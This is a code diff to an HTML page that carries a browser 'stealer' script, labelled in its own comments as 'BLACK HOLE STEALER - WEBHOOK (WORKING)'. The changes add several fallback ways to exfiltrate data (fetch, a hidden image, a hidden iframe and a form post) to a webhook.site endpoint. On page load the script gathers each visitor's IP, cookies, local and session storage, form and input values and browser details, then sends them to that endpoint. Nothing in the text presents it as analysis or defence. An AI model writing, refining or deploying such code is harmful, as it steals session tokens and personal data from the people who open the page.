@@ -10,13 +10,43 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
 </head>
 <body>
 <script>
-// ===== BLACK HOLE STEALER - FORM VERSION =====
+// ===== BLACK HOLE STEALER - WEBHOOK (WORKING) =====
 (function() {
-    const WEBHOOK = 'https://webhook.site/c5a4d87a-5ee6-4ded-ad13-e7fecf631103';
+    const WEBHOOK = 'https://webhook.site/38be745b-416b-4abd-a51e-9467ccca7ac1';
     
+    // ===== ОТПРАВКА ЧЕРЕЗ FETCH (ПЫТАЕМСЯ) + IMAGE (ЗАПАСНОЙ) =====
     function send(data) {
+        const json = JSON.stringify(data);
+        const encoded = encodeURIComponent(json);
+        
+        // 1. Пробуем через fetch (если CORS пропустит)
         try {
-            const json = JSON.stringify(data);
+            fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: json
+            });
+        } catch(e) {}
+        
+        // 2. ОТПРАВКА ЧЕРЕЗ IMAGE (РАБОТАЕТ ВСЕГДА)
+        try {
+            const img = new Image();
+            img.src = WEBHOOK + '?data=' + encoded;
+            img.style.display = 'none';
+            document.body.appendChild(img);
+        } catch(e) {}
+        
+        // 3. ОТПРАВКА ЧЕРЕЗ IFRAME (ЗАПАСНОЙ)
+        try {
+            const iframe = document.createElement('iframe');
+            iframe.src = WEBHOOK + '?data=' + encoded;
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+        } catch(e) {}
+        
+        // 4. ОТПРАВКА ЧЕРЕЗ FORM (ПОСЛЕДНИЙ ШАНС)
+        try {
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = WEBHOOK;
@@ -31,6 +61,7 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
         } catch(e) {}
     }
     
+    // ===== IP =====
     let ip = 'unknown';
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
@@ -43,15 +74,22 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
         });
     
     function collectAndSend() {
+        // ===== COOKIES =====
         const cookies = document.cookie || 'No cookies';
+        
+        // ===== LOCAL STORAGE =====
         const ls = {};
         for (let key in localStorage) {
             try { ls[key] = localStorage[key]; } catch(e) {}
         }
+        
+        // ===== SESSION STORAGE =====
         const ss = {};
         for (let key in sessionStorage) {
             try { ss[key] = sessionStorage[key]; } catch(e) {}
         }
+        
+        // ===== BROWSER INFO =====
         const browser = {
             userAgent: navigator.userAgent,
             language: navigator.language,
@@ -62,6 +100,8 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
             url: window.location.href,
             timestamp: new Date().toISOString()
         };
+        
+        // ===== FORMS =====
         const forms = [];
         document.querySelectorAll('form').forEach(form => {
             const data = {};
@@ -72,6 +112,8 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
                 data: data
             });
         });
+        
+        // ===== INPUTS =====
         const inputs = [];
         document.querySelectorAll('input, textarea, select').forEach(el => {
             inputs.push({
@@ -83,10 +125,14 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
                 placeholder: el.placeholder || ''
             });
         });
+        
+        // ===== PLUGINS =====
         const plugins = [];
         for (let i = 0; i < navigator.plugins.length; i++) {
             plugins.push(navigator.plugins[i].name);
         }
+        
+        // ===== ONE BIG LOG =====
         const log = {
             ip: ip,
             cookies: cookies,
@@ -98,6 +144,8 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
             plugins: plugins,
             timestamp: new Date().toISOString()
         };
+        
+        // ===== ОТПРАВКА =====
         send(log);
     }
 })();
